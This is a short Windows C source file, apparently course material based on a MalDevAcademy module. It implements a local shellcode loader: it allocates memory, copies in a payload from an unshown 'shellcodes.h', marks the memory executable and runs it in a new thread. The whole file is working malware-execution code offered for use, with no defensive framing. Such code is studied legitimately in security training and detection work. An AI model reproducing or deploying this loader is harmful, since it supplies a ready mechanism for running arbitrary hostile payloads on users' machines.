#include <Windows.h>
#include <stdio.h>

#include "shellcodes.h"


// Based on:
//   Local Payload Execution - Shellcode
//   https://maldevacademy.com/modules/27
//   @NUL0x4C | @mrd0x : MalDevAcademy


int example_1() {
    PBYTE       payload = (PBYTE)shellcode;
    SIZE_T      payloadSize = sizeof(shellcode);

    // RW
    PVOID shellcodeAddr = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (shellcodeAddr == NULL) {
        printf("VirtualAlloc failed\n");
        return 1;
    }

    // COPY
    memcpy(shellcodeAddr, payload, payloadSize);

    // RW->RWX
    DWORD dwOldProtection = NULL;
    if (!VirtualProtect(shellcodeAddr, payloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("VirtualProtect Failed With Error: %d \n", GetLastError());
        return -1;
    }

    // THREAD
    DWORD threadId;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, shellcodeAddr, 0, &threadId);
    if (hThread == NULL) {
        printf("CreateThread failed\n");
        return 1;
    }

    // WAIT
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}
